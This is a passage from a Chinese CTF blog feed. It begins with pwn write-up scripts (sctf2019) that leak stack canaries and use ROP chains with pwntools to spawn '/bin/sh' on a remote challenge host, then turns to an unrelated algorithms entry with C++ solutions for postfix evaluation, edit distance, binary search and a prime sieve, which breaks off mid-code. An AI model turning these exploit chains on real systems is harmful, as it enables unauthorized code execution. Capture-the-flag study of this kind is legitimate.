class="number">33</span>])</span><br><span class="line">canary=int(a[<span class="number">17</span>:<span class="number">33</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> canary</span><br><span class="line">vmmap=int(a[<span class="number">3</span>:<span class="number">15</span>],<span class="number">16</span>)<span class="number">-0xabf</span></span><br><span class="line"><span class="keyword">print</span> vmmap</span><br><span class="line">pwn=vmmap+<span class="number">0xaa0</span></span><br><span class="line">pop=vmmap+<span class="number">0xdb3</span></span><br><span class="line">bss=vmmap+<span class="number">0x202088</span></span><br><span class="line">pop_rsi=vmmap+<span class="number">0xdb1</span></span><br><span class="line">reada=vmmap+<span class="number">0x8f0</span></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x34</span>+p64(canary)+<span class="string">'b'</span>*<span class="number">8</span>+p64(pop)+<span class="string">'\x00'</span>*<span class="number">8</span>+p64(pop_rsi)+p64(bss)*<span class="number">2</span>+p64(reada)+p64(pop)+p64(bss)+p64(pwn))</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>栈溢出，字符串没用0截断可以泄露canary</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./pwn9')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.4'</span>,<span class="number">50009</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'split', '-h']</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'YWFhYWFhYWFh'</span>)</span><br><span class="line"></span><br><span class="line">a=<span class="string">'\x00'</span>+p.recv()[<span class="number">21</span>:<span class="number">28</span>]</span><br><span class="line"></span><br><span class="line">canary=u64(a)</span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x6ccbc0</span></span><br><span class="line">reada=<span class="number">0x43ff70</span></span><br><span class="line"></span><br><span class="line">log.success(hex(canary))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'yes'</span>)</span><br><span class="line"></span><br><span class="line">b=<span class="string">'a'</span>*<span class="number">8</span>+p64(canary)+<span class="string">'a'</span>*<span class="number">8</span>+p64(<span class="number">0x401e36</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x401f57</span>)+p64(bss)+p64(reada)+p64(<span class="number">0x4715e4</span>)+p64(<span class="number">59</span>)+p64(<span class="number">0x401e36</span>)+p64(bss)+p64(<span class="number">0x401f57</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x4433e6</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x4003da</span>)</span><br><span class="line"></span><br><span class="line">payload=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'no'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4715e4 pop eax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">401e36 pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">401f57 : pop rsi ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4433e6 : pop rdx ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall 4003da'''</span></span><br></pre></td></tr></table></figure><p>因为这比赛用的libc很迷，特意学了下libcdb。。。</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>后缀计算，就是一个栈的问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line"><span class="keyword">int</span> a,b;</span><br><span class="line"><span class="built_in">string</span> text;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="function">ifstream <span class="title">inFile</span><span class="params">(<span class="string">"p.in"</span>)</span></span>;</span><br><span class="line"><span class="function">ofstream <span class="title">outFile</span><span class="params">(<span class="string">"p.out"</span>)</span></span>;</span><br><span class="line">streambuf *cin_buf=<span class="built_in">cin</span>.rdbuf();</span><br><span class="line">streambuf *cout_buf=<span class="built_in">cout</span>.rdbuf();</span><br><span class="line"><span class="built_in">cin</span>.rdbuf(inFile.rdbuf());</span><br><span class="line"><span class="built_in">cout</span>.rdbuf(outFile.rdbuf());</span><br><span class="line">getline(<span class="built_in">cin</span>,text);</span><br><span class="line"><span class="keyword">int</span> len=text.length();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;++i)&#123;</span><br><span class="line"><span class="keyword">if</span>(text[i]==<span class="string">' '</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(text[i]==<span class="string">'+'</span>)</span><br><span class="line">&#123;</span><br><span class="line">a=tmp.top();</span><br><span class="line">tmp.pop();</span><br><span class="line">b=tmp.top();</span><br><span class="line">tmp.pop();</span><br><span class="line">tmp.push(a+b);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(text[i]==<span class="string">'-'</span>)</span><br><span class="line">&#123;</span><br><span class="line">a=tmp.top();</span><br><span class="line">tmp.pop();</span><br><span class="line">b=tmp.top();</span><br><span class="line">tmp.pop();</span><br><span class="line">tmp.push(b-a);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(text[i]==<span class="string">'-'</span>)</span><br><span class="line">&#123;</span><br><span class="line">a=tmp.top();</span><br><span class="line">tmp.pop();</span><br><span class="line">b=tmp.top();</span><br><span class="line">tmp.pop();</span><br><span class="line">tmp.push(b-a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(text[i]==<span class="string">'*'</span>)</span><br><span class="line">&#123;</span><br><span class="line">a=tmp.top();</span><br><span class="line">tmp.pop();</span><br><span class="line">b=tmp.top();</span><br><span class="line">tmp.pop();</span><br><span class="line">tmp.push(b*a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(text[i]==<span class="string">'/'</span>)</span><br><span class="line">&#123;</span><br><span class="line">a=tmp.top();</span><br><span class="line">tmp.pop();</span><br><span class="line">b=tmp.top();</span><br><span class="line">tmp.pop();</span><br><span class="line">tmp.push(b/(<span class="keyword">float</span>)a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="string">'0'</span>&lt;=text[i]&amp;&amp;text[i]&lt;=<span class="string">'9'</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(text[i]==<span class="string">' '</span>)</span><br><span class="line">&#123;++i;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">k=k*<span class="number">10</span>+text[i]-<span class="string">'0'</span>;</span><br><span class="line">++i;</span><br><span class="line">&#125;</span><br><span class="line">tmp.push(k);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;tmp.top()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;de1ctf&quot;&gt;&lt;a href=&quot;#de1ctf&quot; class=&quot;headerlink&quot; title=&quot;de1ctf&quot;&gt;&lt;/a&gt;de1ctf&lt;/h1&gt;&lt;p&gt;xorz&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;</summary>
      
    
    
    
    <category term="ctf wp" scheme="http://pidanxu.github.io/categories/ctf-wp/"/>
    
    
    <category term="sctf2019" scheme="http://pidanxu.github.io/tags/sctf2019/"/>
    
  </entry>
  
  <entry>
    <title>算法总结3</title>
    <link href="http://pidanxu.github.io/2019/08/26/%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%933/"/>
    <id>http://pidanxu.github.io/2019/08/26/%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%933/</id>
    <published>2019-08-26T08:15:30.000Z</published>
    <updated>2019-08-26T09:24:50.048Z</updated>
    
    <content type="html"><![CDATA[<h2 id="字符串编辑距离"><a href="#字符串编辑距离" class="headerlink" title="字符串编辑距离"></a>字符串编辑距离</h2><p>动态规划</p><p>把两个字符串变成相同的三个基本操作定义如下：</p><ol><li>修改一个字符（如把a  变成b）</li><li>增加一个字符(如abed  变成abedd)</li><li><p>删除一个字符（如jackbllog  变成jackblog）<br> 针对于jackbllog 到jackblog  只需要删除一个或增加一个l  就可以把两个字符串变为相同。<br> 把这种操作需要的最小次数定义为两个字符串的编辑距离L。<br> 编写程序计算指定文件中字符串的距离。输入两个长度不超过512 字节的ASCII 字符串，在<br> 屏幕上输出字符串的编辑距离。<br> 输入样例<br> Hello world!<br> Hello word!<br> 输出样例<br> 13</p><p>设置从字符串s1[i]点变换至s2[j]点的最短距离为dp[i][j]，dp[i][j]可以分成三种情况来看(以Hello和Hllll为例)：</p></li></ol><p>1.替换:以最后一个字符为例，将o替换为l，那么dp[i][j]=dp[i-1][j-1]+1。</p><p>2.增加:dp[i][j]=dp[i][j-1]+1</p><p>3.删除:dp[i][j]=dp[i-1][j]+1</p><p>4.dp[0][i]=dp[i][0]=i</p><p>所以只要从第一个字符开始，每次都选三种状态里的最短距离，就能得到编辑距离了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">1002</span>][<span class="number">1002</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//char str1[1002],str2[1002];</span></span><br><span class="line"><span class="built_in">string</span> str1,str2;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">min_get</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b ,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> minn=a;</span><br><span class="line"><span class="keyword">if</span>(a&gt;b)</span><br><span class="line">minn=b;</span><br><span class="line"><span class="keyword">if</span>(minn&gt;c)</span><br><span class="line">minn=c;</span><br><span class="line"><span class="keyword">return</span> minn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_distance</span><span class="params">(<span class="keyword">int</span> len1,<span class="keyword">int</span> len2)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=len1;++i)</span><br><span class="line">dp[i][<span class="number">0</span>]=i;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=len2;++j)</span><br><span class="line">dp[<span class="number">0</span>][j]=j;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len1;++i)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=len2;++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> res1=str1[i]==str2[j]?<span class="number">0</span>:<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> add=dp[i][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> sub=dp[i<span class="number">-1</span>][j]+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> equl=dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+res1;</span><br><span class="line">dp[i][j]=min_get(add,sub,equl);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dp[len1][len2];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="function">ofstream <span class="title">outFile</span><span class="params">(<span class="string">"p.out"</span>)</span></span>;</span><br><span class="line"><span class="function">ifstream <span class="title">inFile</span><span class="params">(<span class="string">"p.in"</span>)</span></span>;</span><br><span class="line">streambuf *in_buf=<span class="built_in">cin</span>.rdbuf();</span><br><span class="line">streambuf *out_buf=<span class="built_in">cout</span>.rdbuf();</span><br><span class="line"><span class="built_in">cin</span>.rdbuf(inFile.rdbuf());</span><br><span class="line"><span class="built_in">cout</span>.rdbuf(outFile.rdbuf());</span><br><span class="line"></span><br><span class="line">getline(<span class="built_in">cin</span>,str1);</span><br><span class="line">getline(<span class="built_in">cin</span>,str2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;get_distance(str1.length(),str2.length());</span><br><span class="line"><span class="comment">/*freopen("E:\\vs2010\\string_edit_distance\\Debug\\p.in","r",stdin);</span></span><br><span class="line"><span class="comment">freopen("E:\\vs2010\\string_edit_distance\\Debug\\p.out","w",stdout);</span></span><br><span class="line"><span class="comment">scanf("%[^\n]",&amp;str1);</span></span><br><span class="line"><span class="comment">scanf("%[^\n]",&amp;str2);</span></span><br><span class="line"><span class="comment">printf("%d",get_distance(strlen(str1),strlen(str2)));*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h2><p>这个没啥好说的，需要注意的是每次二分left=mid+1,right=mid-1。</p><p>大家一定都能熟练掌握二分查找啦！那么来计算二分的次数吧！<br> 约定二分的中点mid = (left + right) / 2。<br> 输入：<br> 第一行输入一个整数N（N&lt;=10000）。<br> 第二行输入N个升序整数。<br> 第三行输入一个待查找的整数（必定在第二行中出现过）。<br> 输出：<br> 输出二分查找该整数时，进行过多少次二分。<br> 输入样例<br> 5<br> 18 53 54 74 99<br> 53<br> 输出样例<br> 2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="function">ifstream <span class="title">inFile</span><span class="params">(<span class="string">"p.in"</span>)</span></span>;</span><br><span class="line"><span class="function">ofstream <span class="title">outFile</span><span class="params">(<span class="string">"p.out"</span>)</span></span>;</span><br><span class="line">streambuf *out_stream=<span class="built_in">cout</span>.rdbuf();</span><br><span class="line">streambuf *in_stream=<span class="built_in">cin</span>.rdbuf();</span><br><span class="line"><span class="built_in">cin</span>.rdbuf(inFile.rdbuf());</span><br><span class="line"><span class="built_in">cout</span>.rdbuf(outFile.rdbuf());</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; a;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;N;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;++i)&#123;</span><br><span class="line"><span class="keyword">int</span> tmp;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">a.push_back(tmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> found;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;found;</span><br><span class="line"><span class="keyword">int</span> left=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> right=N<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(right&gt;=left)&#123;</span><br><span class="line"><span class="keyword">int</span> mid=(right-left)/<span class="number">2</span>+left;</span><br><span class="line"><span class="keyword">if</span>(a[mid]&gt;found)&#123;</span><br><span class="line">right=mid<span class="number">-1</span>;</span><br><span class="line">res+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(a[mid]&lt;found)&#123;</span><br><span class="line">left=mid+<span class="number">1</span>;</span><br><span class="line">res+=<span class="number">1</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(a[mid]==found)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;res;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="快速找素数"><a href="#快速找素数" class="headerlink" title="快速找素数"></a>快速找素数</h2><p>欧拉筛，就是用已有素数把每个数都乘一遍可以遍历所有合数(如果该数是已有素数的倍数，可以break，因为该素数会乘所有数，所以会重复工作)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//typedef long long ll;</span></span><br><span class="line"><span class="keyword">bool</span> isPrime[<span class="number">100000001</span>];</span><br><span class="line"><span class="keyword">int</span> prime[<span class="number">100000001</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">/*ifstream inFile("p.in");</span></span><br><span class="line"><span class="comment">ofstream outFile("p.out");</span></span><br><span class="line"><span class="comment">streambuf* outBuf=cout.rdbuf();</span></span><br><span class="line"><span class="comment">streambuf* inBuf=cin.rdbuf();</span></span><br><span class="line"><span class="comment">cin.rdbuf(inFile.rdbuf());</span></span><br><span class="line"><span class="comment">cout.rdbuf(outFile.rdbuf());*/</span></span><br><span class="line"><span class="comment">//int tmp_sqrt=sqrt(100000001);</span></span><br><span class="line"><span class="built_in">memset</span>(isPrime,<span class="literal">true</span>,<span class="number">100000001</span>);</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;N;</span><br><span class="line">isPrime[<span class="number">0</span>]=isPrime[<span class="number">1</span>]=<span class="literal">false</span>;</span><br><span class="line"><span class="comment">//int sqrtN=sqrt(N);</span></span><br><span class="line"><span class="keyword">int</span> current=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=N;++i)&#123;</span><br><span class="line"><span class="keyword">if</span>(isPrime[i]==<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">prime[current++]=i;</span><br><span class="line"><span class="comment">//prime[current++]=i;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=current&amp;&amp;prime[j]*i&lt;=N;++j)&#123;</span><br><span class="line"><span class="comment">//isPrime[j]=false;</span></span><br><span class="line">isPrime[prime[j]*i]=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(i%prime[j]==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//for(int i=0;i&lt;=N;++i)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//if(isPrime[i])</span></span><br><span class="line"><span class="comment">//prime[current++]=i;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//if(N==0)</span></span><br><span 